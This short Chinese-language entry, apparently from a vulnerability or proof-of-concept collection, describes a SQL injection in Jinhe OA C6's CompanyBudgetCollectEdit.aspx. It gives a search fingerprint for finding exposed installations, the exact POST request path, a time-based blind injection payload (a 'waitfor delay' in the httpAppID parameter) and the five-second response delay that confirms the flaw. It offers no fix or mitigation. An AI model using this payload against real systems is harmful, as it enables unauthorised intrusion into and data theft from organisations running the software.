# 金和OAC6CompanyBudgetCollectEdit存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollectEdit.aspx/ HTTP/1.1`

**Payload**
```
httpAppID=1'waitfor+delay+'0:0:5'--+&httpOID=1
```
- **响应特征**：200 响应时间≥5S